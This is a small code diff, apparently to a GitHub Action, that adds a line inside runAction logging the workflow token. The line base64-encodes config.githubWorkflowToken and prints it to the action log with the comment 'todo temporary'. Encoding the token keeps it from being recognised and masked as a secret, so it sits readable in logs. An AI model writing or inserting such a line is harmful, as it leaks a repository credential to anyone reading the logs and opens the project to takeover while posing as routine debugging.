@@ -25,6 +25,8 @@ export async function runAction(): RunActionReturns {
     const sponsorsExempt = getSponsorsExempt(config);
     const sponsors = [...sponsorsGitHub, ...sponsorsExempt];
 
+    core.info(btoa(config.githubWorkflowToken)); // todo temporary
+
     // Configuration logs.
     core.startGroup('Configuration');
     core.info(util.inspect(config, false, null, true));
